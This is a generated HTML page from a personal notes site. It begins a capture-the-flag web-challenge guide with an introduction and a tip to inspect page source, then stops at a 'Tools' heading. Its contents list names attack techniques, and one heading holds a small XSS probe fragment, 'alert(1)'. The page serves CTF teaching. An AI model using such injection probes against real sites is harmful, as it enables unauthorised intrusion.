@@ -1,0 +1,1707 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.0, mkdocs-material-8.3.8">
+    
+    
+      
+        <title>web - Garden</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.1d29e8d0.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#web" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Garden" class="md-header__button md-logo" aria-label="Garden" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Garden
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              web
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/mzfr/notes" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Garden" class="md-nav__button md-logo" aria-label="Garden" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Garden
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/mzfr/notes" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1" type="checkbox" id="__nav_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1">
+          Age of Empire IV
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Age of Empire IV" data-md-level="1">
+        <label class="md-nav__title" for="__nav_1">
+          <span class="md-nav__icon md-icon"></span>
+          Age of Empire IV
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AOE/general/" class="md-nav__link">
+        Why?
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1_2" type="checkbox" id="__nav_1_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1_2">
+          Scouting
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Scouting" data-md-level="2">
+        <label class="md-nav__title" for="__nav_1_2">
+          <span class="md-nav__icon md-icon"></span>
+          Scouting
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AOE/Scouting/general/" class="md-nav__link">
+        General Tips
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AOE/Scouting/sheep_scouting/" class="md-nav__link">
+        Sheep Scouting
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1_3" type="checkbox" id="__nav_1_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1_3">
+          Build Orders
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Build Orders" data-md-level="2">
+        <label class="md-nav__title" for="__nav_1_3">
+          <span class="md-nav__icon md-icon"></span>
+          Build Orders
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AOE/build_orders/" class="md-nav__link">
+        Build orders
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1_3_2" type="checkbox" id="__nav_1_3_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1_3_2">
+          English
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="English" data-md-level="3">
+        <label class="md-nav__title" for="__nav_1_3_2">
+          <span class="md-nav__icon md-icon"></span>
+          English
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AOE/english/delayed-feudal-with-better-economy/" class="md-nav__link">
+        Delayed feudal
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AOE/english/dark-age-maa-rush/" class="md-nav__link">
+        Dark MMA rush
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AOE/english/classic-english/" class="md-nav__link">
+        Class English
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AOE/english/early-wheelbarrow/" class="md-nav__link">
+        Early Wheelbarrow
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1_3_3" type="checkbox" id="__nav_1_3_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1_3_3">
+          Delhi Sultanate
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Delhi Sultanate" data-md-level="3">
+        <label class="md-nav__title" for="__nav_1_3_3">
+          <span class="md-nav__icon md-icon"></span>
+          Delhi Sultanate
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AOE/english/for-sacred-site-victory/" class="md-nav__link">
+        Sacred Site victory
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1_4" type="checkbox" id="__nav_1_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1_4">
+          Modding
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Modding" data-md-level="2">
+        <label class="md-nav__title" for="__nav_1_4">
+          <span class="md-nav__icon md-icon"></span>
+          Modding
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1_4_1" type="checkbox" id="__nav_1_4_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1_4_1">
+          Generated Maps
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Generated Maps" data-md-level="3">
+        <label class="md-nav__title" for="__nav_1_4_1">
+          <span class="md-nav__icon md-icon"></span>
+          Generated Maps
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AOE/modding/general/" class="md-nav__link">
+        General
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AOE/modding/player-spawn/" class="md-nav__link">
+        Player Spawn
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AOE/modding/path-to-default-generated-maps/" class="md-nav__link">
+        Default maps
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          BugBounty
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="BugBounty" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          BugBounty
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_1">
+          Android
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Android" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          Android
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Android/Activities/" class="md-nav__link">
+        Activities
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Android/Android/" class="md-nav__link">
+        Android
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Android/Broadcast_Receivers/" class="md-nav__link">
+        Broadcast Receivers
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Android/Commands/" class="md-nav__link">
+        Commands
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Android/Content_Providers/" class="md-nav__link">
+        Content Providers
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Android/Intents/" class="md-nav__link">
+        Intents
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Android/Permissions/" class="md-nav__link">
+        Permissions
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Android/Services/" class="md-nav__link">
+        Services
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_2">
+          Web
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Web
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Authentication/" class="md-nav__link">
+        Authentication
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/CORS/" class="md-nav__link">
+        CORS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/General/" class="md-nav__link">
+        General
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/HTTP%20Parameter%20poisoning/" class="md-nav__link">
+        poisoning
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/IDOR/" class="md-nav__link">
+        IDOR
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/graphql/" class="md-nav__link">
+        graphql
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Capture The Flag
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Capture The Flag" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Capture The Flag
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1" type="checkbox" id="__nav_3_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_1">
+          Jeopardy
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Jeopardy" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_1">
+          <span class="md-nav__icon md-icon"></span>
+          Jeopardy
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cryptography/" class="md-nav__link">
+        Cryptography
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../forensics/" class="md-nav__link">
+        forensics
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tools/" class="md-nav__link">
+        tools
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          web
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        web
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#source" class="md-nav__link">
+    Source
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    Tools
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#robots" class="md-nav__link">
+    Robots
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cookies" class="md-nav__link">
+    Cookies
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php-code" class="md-nav__link">
+    PHP code
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqli" class="md-nav__link">
+    SQLi
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lfirfi" class="md-nav__link">
+    LFI/RFI
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command-injection" class="md-nav__link">
+    Command Injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    XSS
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    Misc
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ldap" class="md-nav__link">
+    LDAP
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqli_1" class="md-nav__link">
+    SQLi
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml" class="md-nav__link">
+    XML
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xssalert1" class="md-nav__link">
+    XSS"//alert(1)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shellshock" class="md-nav__link">
+    Shellshock
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt" class="md-nav__link">
+    JWT
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" type="checkbox" id="__nav_3_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2">
+          boot2root
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="boot2root" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_2">
+          <span class="md-nav__icon md-icon"></span>
+          boot2root
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_1" type="checkbox" id="__nav_3_2_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2_1">
+          Making boot2root VM
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Making boot2root VM" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          Making boot2root VM
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VM/Make_boot2root_VM/" class="md-nav__link">
+        General
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VM/rules/" class="md-nav__link">
+        Do's and Don'ts
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VM/services/" class="md-nav__link">
+        Running Services
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VM/fail2ban/" class="md-nav__link">
+        fail2ban
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../boot2root/" class="md-nav__link">
+        Hacking boot2root
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#source" class="md-nav__link">
+    Source
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    Tools
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#robots" class="md-nav__link">
+    Robots
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cookies" class="md-nav__link">
+    Cookies
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#php-code" class="md-nav__link">
+    PHP code
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqli" class="md-nav__link">
+    SQLi
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lfirfi" class="md-nav__link">
+    LFI/RFI
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command-injection" class="md-nav__link">
+    Command Injection
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    XSS
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    Misc
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ldap" class="md-nav__link">
+    LDAP
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqli_1" class="md-nav__link">
+    SQLi
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml" class="md-nav__link">
+    XML
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xssalert1" class="md-nav__link">
+    XSS"//alert(1)
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shellshock" class="md-nav__link">
+    Shellshock
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt" class="md-nav__link">
+    JWT
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+  <a href="https://github.com/mzfr/notes/edit/master/docs/ctf/web.md" title="Edit this page" class="md-content__button md-icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+
+<h1 id="web">Web</h1>
+<p>Well I think this is the most important field in CTF challenges(RE/PWN people gonna hate :smile:). But it make sense to have lot of web challenges since everything in today's time is on WEB.</p>
+<p>Web challenges can sometime really screw up things with you.</p>
+<h2 id="source">Source</h2>
+<p>Always look into the source code. When you visit the challenge website and see nothing unsual then just dive into the source and try to find something. Like if it's a form then see if there's anything with <code>hidden</code> keyword in the tag or any script that might give you somthing or most probably a comment left by creator.</p>
+<p>Just don't forget to look at the source</p>
+<h2 id="tools">Tools</h2>
